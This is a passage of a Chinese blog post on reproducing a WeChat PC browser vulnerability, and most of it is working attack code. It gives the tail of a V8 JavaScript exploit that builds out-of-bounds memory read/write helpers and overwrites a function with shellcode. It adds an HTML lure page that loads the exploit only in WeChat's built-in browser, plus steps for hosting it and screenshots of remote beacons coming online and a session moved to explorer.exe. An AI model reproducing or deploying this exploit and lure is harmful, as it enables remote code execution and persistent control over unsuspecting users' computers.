</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">prevent_opt</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">kSlotOffset</span> <span class="o">=</span> <span class="mh">0x1f</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">kBackingStoreOffset</span> <span class="o">=</span> <span class="mh">0xf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">class</span> <span class="nx">LeakArrayBuffer</span> <span class="kr">extends</span> <span class="nx">ArrayBuffer</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">constructor</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kr">super</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">slot</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">page_buffer</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">LeakArrayBuffer</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">page_view</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">page_buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">new</span> <span class="nb">RegExp</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="nx">toString</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s1">&#39;a&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="nx">cb</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">class</span> <span class="nx">DerivedBase</span> <span class="kr">extends</span> <span class="nb">RegExp</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">constructor</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// var array = null;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="kr">super</span><span class="p">(</span><span class="c1">// at this point, the 4-byte allocation for the JSRegExp `this` object
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// has just happened.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">toString</span><span class="o">:</span> <span class="nx">cb</span>
</span></span><span class="line"><span class="cl">            <span class="p">},</span> <span class="s1">&#39;g&#39;</span><span class="c1">// now the runtime JSRegExp constructor is called, corrupting the
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// JSArray.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// this allocation will now directly follow the FixedArray allocation
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// made for `this.data`, which is where `array.elements` points to.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">this_</span><span class="p">.</span><span class="nx">buffer</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nx">g_array</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="nx">this_</span><span class="p">.</span><span class="nx">page_buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// try{
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">var</span> <span class="nx">derived_n</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="sb">`(function derived_n(i) {
</span></span></span><span class="line"><span class="cl"><span class="sb">        if (i == 0) {
</span></span></span><span class="line"><span class="cl"><span class="sb">            return DerivedBase;
</span></span></span><span class="line"><span class="cl"><span class="sb">        }
</span></span></span><span class="line"><span class="cl"><span class="sb">
</span></span></span><span class="line"><span class="cl"><span class="sb">        class DerivedN extends derived_n(i-1) {
</span></span></span><span class="line"><span class="cl"><span class="sb">            constructor() {
</span></span></span><span class="line"><span class="cl"><span class="sb">                super();
</span></span></span><span class="line"><span class="cl"><span class="sb">                return;
</span></span></span><span class="line"><span class="cl"><span class="sb">                </span><span class="si">${</span><span class="s2">&#34;this.a=0;&#34;</span><span class="p">.</span><span class="nx">repeat</span><span class="p">(</span><span class="nx">tDerivedNCount</span><span class="p">)</span><span class="si">}</span><span class="sb">
</span></span></span><span class="line"><span class="cl"><span class="sb">            }
</span></span></span><span class="line"><span class="cl"><span class="sb">        }
</span></span></span><span class="line"><span class="cl"><span class="sb">
</span></span></span><span class="line"><span class="cl"><span class="sb">        return DerivedN;
</span></span></span><span class="line"><span class="cl"><span class="sb">    })`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">gc</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">new</span> <span class="p">(</span><span class="nx">derived_n</span><span class="p">(</span><span class="nx">tDerivedNDepth</span><span class="p">))();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">buffer_view</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">leakPtr</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">page_buffer</span><span class="p">.</span><span class="nx">slot</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">buffer_view</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="nx">kSlotOffset</span><span class="p">,</span> <span class="kc">true</span><span class="p">,</span> <span class="p">...</span><span class="k">this</span><span class="p">.</span><span class="nx">prevent_opt</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">setPtr</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">buffer_view</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="nx">kBackingStoreOffset</span><span class="p">,</span> <span class="nx">addr</span><span class="p">,</span> <span class="kc">true</span><span class="p">,</span> <span class="p">...</span><span class="k">this</span><span class="p">.</span><span class="nx">prevent_opt</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">read32</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">setPtr</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">page_view</span><span class="p">.</span><span class="nx">getUint32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="kc">true</span><span class="p">,</span> <span class="p">...</span><span class="k">this</span><span class="p">.</span><span class="nx">prevent_opt</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">write32</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">setPtr</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">page_view</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="kc">true</span><span class="p">,</span> <span class="p">...</span><span class="k">this</span><span class="p">.</span><span class="nx">prevent_opt</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">write8</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">setPtr</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">page_view</span><span class="p">.</span><span class="nx">setUint8</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="p">...</span><span class="k">this</span><span class="p">.</span><span class="nx">prevent_opt</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">setBytes</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">content</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">content</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">write8</span><span class="p">(</span><span class="nx">addr</span> <span class="o">+</span> <span class="nx">i</span><span class="p">,</span> <span class="nx">content</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">this</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">trigger</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">oob</span> <span class="o">=</span> <span class="nx">oobAccess</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">func_ptr</span> <span class="o">=</span> <span class="nx">oob</span><span class="p">.</span><span class="nx">leakPtr</span><span class="p">(</span><span class="nx">target_function</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="s1">&#39;[*] target_function at 0x&#39;</span> <span class="o">+</span> <span class="nx">func_ptr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">kCodeInsOffset</span> <span class="o">=</span> <span class="mh">0x1b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">code_addr</span> <span class="o">=</span> <span class="nx">oob</span><span class="p">.</span><span class="nx">read32</span><span class="p">(</span><span class="nx">func_ptr</span> <span class="o">+</span> <span class="nx">kCodeInsOffset</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="s1">&#39;[*] code_addr at 0x&#39;</span> <span class="o">+</span> <span class="nx">code_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">oob</span><span class="p">.</span><span class="nx">setBytes</span><span class="p">(</span><span class="nx">code_addr</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">target_function</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="s2">&#34;start running&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">trigger</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>将上面生成的shellcode 替换到此处
<img src="/p/whp5em3l/06.jpg"
	width="810"
	height="793"
	srcset="/p/whp5em3l/06_hu9f1c25331c847f896d0e7535f184acbf_43417_480x0_resize_q75_box.jpg 480w, /p/whp5em3l/06_hu9f1c25331c847f896d0e7535f184acbf_43417_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="替换shellcode内容"
	
	
		class="gallery-image" 
		data-flex-grow="102"
		data-flex-basis="245px"
	
></p>
<h4 id="创建一个html文件调用js">创建一个html文件调用js</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>正在加载网页<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;utf-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 对浏览器的UserAgent进行正则匹配，不含有微信独有标识的则为其他浏览器
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">var</span> <span class="nx">useragent</span> <span class="o">=</span> <span class="nx">navigator</span><span class="p">.</span><span class="nx">userAgent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">useragent</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/WindowsWechat/i</span><span class="p">)</span> <span class="o">!=</span> <span class="s1">&#39;WindowsWechat&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 这里警告框会阻塞当前页面继续加载
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;已禁止本次访问：您必须使用PC端微信内置浏览器访问本页面！&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 以下代码是用javascript强行关闭当前页面
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kd">var</span> <span class="nx">opened</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;about:blank&#39;</span><span class="p">,</span> <span class="s1">&#39;_self&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">opened</span><span class="p">.</span><span class="nx">opener</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">opened</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;exp.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;font-size: 1.3em;margin: 10px auto;width: 200px;display: block;&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">正在加载网页中...
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="2搭建服务">2.搭建服务</h3>
<h4 id="随便拿什么搭都可以-我直接用phpstudy搭建下">随便拿什么搭都可以 我直接用phpstudy搭建下</h4>
<p><img src="/p/whp5em3l/07.jpg"
	width="766"
	height="81"
	srcset="/p/whp5em3l/07_hubb538138f9af53ea6947908b63d7873c_4892_480x0_resize_q75_box.jpg 480w, /p/whp5em3l/07_hubb538138f9af53ea6947908b63d7873c_4892_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="搭建服务"
	
	
		class="gallery-image" 
		data-flex-grow="945"
		data-flex-basis="2269px"
	
></p>
<h3 id="测试上线与进程转移效果">测试上线与进程转移效果</h3>
<p>可以看的会上线两个 beacon 基于微信的会话在浏览器关闭后即掉线
<img src="/p/whp5em3l/08.jpg"
	width="1485"
	height="89"
	srcset="/p/whp5em3l/08_hua85dd01428641812b675ad9a08dd4f4d_103761_480x0_resize_q75_box.jpg 480w, /p/whp5em3l/08_hua85dd01428641812b675ad9a08dd4f4d_103761_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="坚挺的会话"
	
	
		class="gallery-image" 
		data-flex-grow="1668"
		data-flex-basis="4004px"
	
></p>
<h3 id="而转移到explorerexe的会话依然坚挺">而转移到explorer.exe的会话依然坚挺！</h3>
<p><img src="/p/whp5em3l/09.jpg"
	width="797"
	height="509"
	srcset="/p/whp5em3l/09_hue52c77d2fa37c41725c819aa2e2a68ad_342903_480x0_resize_q75_box.jpg 480w, /p/whp5em3l/09_hue52c77d2fa37c41725c819aa2e2a68ad_342903_1024x0_resize_q75_box.jpg 1024w"
	loading="lazy"
	
		alt="上号"
	
	
		class="gallery-image" 
		data-flex-grow="156"
		data-flex-basis="375px"
	
></p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/%E5%BE%AE%E4%BF%A1/">微信</a>
        
            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">相关文章</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/4qx86up5/">
        
        
            <div class="article-image">
                
                    <img src="https://w.wallhaven.cc/full/rr/wallhaven-rr629w.png" loading="lazy" data-key="4qx86up5" data-hash="https://w.wallhaven.cc/full/rr/wallhaven-rr629w.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/9k574hdx/">
        
        
            <div class="article-image">
                
                    <img src="https://w.wallhaven.cc/full/3l/wallhaven-3l2k7y.png" loading="lazy" data-key="9k574hdx" data-hash="https://w.wallhaven.cc/full/3l/wallhaven-3l2k7y.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">phpstudy后门利用方法及getshell</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/vkxkois6/">
        
        
            <div class="article-image">
                
                    <img src="https://w.wallhaven.cc/full/ex/wallhaven-ex277r.png" loading="lazy" data-key="vkxkois6" data-hash="https://w.wallhaven.cc/full/ex/wallhaven-ex277r.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">ecshop2.x代码执行</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/gxvtssvo/">
        
        
            <div class="article-image">
                
                    <img src="https://w.wallhaven.cc/full/d6/wallhaven-d6d26m.png" loading="lazy" data-key="gxvtssvo" data-hash="https://w.wallhaven.cc/full/d6/wallhaven-d6d26m.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">AppCMS 2.0.101 后门分析</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/r3x4n4vi/">
        
        
            <div class="article-image">
                
                    <img src="https://w.wallhaven.cc/full/6d/wallhaven-6dp98l.png" loading="lazy" data-key="r3x4n4vi" data-hash="https://w.wallhaven.cc/full/6d/wallhaven-6dp98l.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Typecho install.php 反序列化导致任意代码执行</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src="https://utteranc.es/client.js" 
        repo="360rce/blog-comment"
        issue-term="pathname"
        
        label="utterances"
        
        crossorigin="anonymous"
        async
        >
</script>

<style>
    .utterances {
        max-width: unset;
    }
</style>

<script>
    let utterancesLoaded = false;

    function setUtterancesTheme(theme) {
        let utterances = document.querySelector('.utterances iframe');
        if (utterances) {
            utterances.contentWindow.postMessage(
                {
                    type: 'set-theme',
                    theme: `github-${theme}`
                },
                'https://utteranc.es'
            );
        }
    }

    addEventListener('message', event => {
        if (event.origin !== 'https://utteranc.es') return;

        
        utterancesLoaded = true;
        setUtterancesTheme(document.documentElement.dataset.scheme)
    });

    window.addEventListener('onColorSchemeChange', (e) => {
        if (!utterancesLoaded) return;
        setUtterancesTheme(e.detail)
    })
</script>


    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2023 本博客所有文章除特别声明外，均采用 CC BY-SA 4.0 协议 ，转载请注明出处！
    </section>
    <i class="powerby">
    <span id="busuanzi_container_site_pv">
        访问量&nbsp;-&nbsp;<span id="busuanzi_value_site_pv"></span>
    </span>&nbsp;
    <span id="busuanzi_container_site_uv">
        访客数&nbsp;-&nbsp;<span id="busuanzi_value_site_uv"></span>人次
      </span>
    </i>


</footer>
<script>
    (function(u, c) {
      var d = document, t = 'script', o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function(e) { c(e); }); }
      s.parentNode.insertBefore(o, s);
    })('//cdn.bootcss.com/pangu/4.0.7/pangu.min.js', function() {
      pangu.spacingPage();
    });
</script>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>


    </body>
</html>
